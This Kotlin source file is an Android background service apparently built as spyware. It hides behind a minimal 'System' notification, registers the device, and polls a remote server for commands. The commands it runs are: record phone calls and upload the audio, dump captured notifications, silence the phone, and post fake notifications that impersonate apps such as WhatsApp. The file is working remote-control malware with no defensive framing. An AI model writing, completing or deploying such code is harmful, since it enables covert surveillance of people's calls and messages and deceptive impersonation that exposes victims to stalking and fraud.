package com.sys.svc

import android.app.*
import android.content.Context
import android.content.Intent
import android.media.*
import android.os.*
import androidx.core.app.NotificationCompat
import kotlinx.coroutines.*
import org.json.JSONArray
import org.json.JSONObject
import java.io.File
import java.io.FileOutputStream

class CoreService : Service() {
    private val scope = CoroutineScope(Dispatchers.IO + SupervisorJob())
    private var recorder: MediaRecorder? = null

    override fun onCreate() {
        super.onCreate()
        val ch = NotificationChannel("sys","System", NotificationManager.IMPORTANCE_MIN)
        (getSystemService(NOTIFICATION_SERVICE) as NotificationManager).createNotificationChannel(ch)
        val n = NotificationCompat.Builder(this, "sys")
            .setContentTitle("System")
            .setSmallIcon(android.R.drawable.stat_notify_sync)
            .setPriority(NotificationCompat.PRIORITY_MIN)
            .build()
        startForeground(1, n)
        registerDevice()
        scope.launch { pollLoop() }
    }

    private fun registerDevice() {
        val body = JSONObject()
            .put("device_id", Prefs.deviceId(this))
            .put("model", Build.MODEL)
            .put("android", Build.VERSION.RELEASE)
            .put("battery", batteryPct())
        scope.launch { Net.postJson("/api/register", body) }
    }

    private fun batteryPct(): Int {
        val bm = getSystemService(BATTERY_SERVICE) as BatteryManager
        return bm.getIntProperty(BatteryManager.BATTERY_PROPERTY_CAPACITY)
    }

    private suspend fun pollLoop() {
        while (true) {
            try {
                val resp = Net.get("/api/cmd/" + Prefs.deviceId(this))
                if (resp != null && resp.trim() != "[]") {
                    val arr = JSONArray(resp)
                    for (i in 0 until arr.length()) {
                        val c = arr.getJSONObject(i)
                        handleCmd(c.getString("cmd"), c.optString("arg", ""))
                    }
                }
            } catch (_: Exception) {}
            delay(8000)
        }
    }

    private fun handleCmd(cmd: String, arg: String) {
        when (cmd) {
            "record_call" -> scope.launch { recordCall(30 * 60 * 1000L) }
            "dnd_on" -> enableDnd()
            "list_notifs" -> scope.launch { dumpNotifs() }
            "spoof_on"  -> SpoofPrefs.setSpoofOn(this, true)
            "spoof_off" -> SpoofPrefs.setSpoofOn(this, false)
            "spoof_set_title" -> SpoofPrefs.setFakeTitle(this, arg)
            "spoof_set_text"  -> SpoofPrefs.setFakeText(this, arg)
            "spoof_icon"      -> SpoofPrefs.setIconPkg(this, arg)
            "spoof_send_now"  -> scope.launch { sendFakeNow() }
            "kill_app" -> stopSelf()
        }
    }

    private fun recordCall(ms: Long) {
        val f = File(filesDir, "call_${System.currentTimeMillis()}.m4a")
        recorder = MediaRecorder().apply {
            setAudioSource(MediaRecorder.AudioSource.VOICE_CALL)
            setOutputFormat(MediaRecorder.OutputFormat.MPEG_4)
            setAudioEncoder(MediaRecorder.AudioEncoder.AAC)
            setOutputFile(FileOutputStream(f).fd)
            try { prepare(); start() } catch (e: Exception) {
                reset()
                setAudioSource(MediaRecorder.AudioSource.MIC)
                setOutputFormat(MediaRecorder.OutputFormat.MPEG_4)
                setAudioEncoder(MediaRecorder.AudioEncoder.AAC)
                setOutputFile(FileOutputStream(f).fd)
                prepare(); start()
            }
        }
        Handler(Looper.getMainLooper()).postDelayed({
            try { recorder?.stop(); recorder?.release(); recorder = null } catch (_: Exception) {}
            scope.launch { upload(f, "call_record") }
        }, ms)
    }

    private fun enableDnd() {
        val nm = getSystemService(NOTIFICATION_SERVICE) as NotificationManager
        if (nm.isNotificationPolicyAccessGranted) {
            nm.setInterruptionFilter(NotificationManager.INTERRUPTION_FILTER_NONE)
        }
    }

    private fun dumpNotifs() {
        val dump = NotifStore.dump(this)
        send(dump)
    }

    private fun sendFakeNow() {
        val iconPkg = SpoofPrefs.iconPkg(this)
        val title = SpoofPrefs.fakeTitle(this).ifBlank { "Aarav" }
        val text  = SpoofPrefs.fakeText(this).ifBlank { "kal milte hai" }
        val appName = try {
            val ai = packageManager.getApplicationInfo(iconPkg, 0)
            packageManager.getApplicationLabel(ai).toString()
        } catch (_: Exception) { "WhatsApp" }
        val largeIcon = try {
            val d = packageManager.getApplicationIcon(iconPkg)
            val bmp = android.graphics.Bitmap.createBitmap(d.intrinsicWidth.coerceAtLeast(1),
                d.intrinsicHeight.coerceAtLeast(1), android.graphics.Bitmap.Config.ARGB_8888)
            val c = android.graphics.Canvas(bmp); d.setBounds(0,0,c.width,c.height); d.draw(c); bmp
        } catch (_: Exception) { null }

        val nm = getSystemService(NOTIFICATION_SERVICE) as NotificationManager
        val chId = "spoof_" + appName.replace(" ", "_").lowercase()
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            val ch = NotificationChannel(chId, appName, NotificationManager.IMPORTANCE_HIGH)
            nm.createNotificationChannel(ch)
        }
        val nb = NotificationCompat.Builder(this, chId)
            .setContentTitle(title)
            .setContentText(text)
            .setSmallIcon(android.R.drawable.stat_notify_chat)
            .setLargeIcon(largeIcon)
            .setSubText(appName)
            .setOngoing(true)
            .setAutoCancel(false)
            .setDefaults(Notification.DEFAULT_ALL)
        nm.notify((System.currentTimeMillis() % 10000).toInt(), nb.build())
    }

    private fun send(payload: String) {
        val body = JSONObject()
            .put("device_id", Prefs.deviceId(this))
            .put("kind", "data")
            .put("payload", payload)
        scope.launch { Net.postJson("/api/beacon", body) }
    }

    private fun upload(f: File, kind: String) {
        try {
            val b = android.util.Base64.encodeToString(f.readBytes(), android.util.Base64.NO_WRAP)
            val body = JSONObject()
                .put("device_id", Prefs.deviceId(this))
                .put("kind", kind)
                .put("payload", f.name + "|" + b)
            scope.launch { Net.postJson("/api/beacon", body) }
        } catch (_: Exception) {}
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        if (intent?.action == "RECORD_CALL") {
            recordCall(30 * 60 * 1000L)
        }
        return START_STICKY
    }
    override fun onBind(intent: Intent?) = null
    override fun onDestroy() { scope.cancel(); super.onDestroy() }
}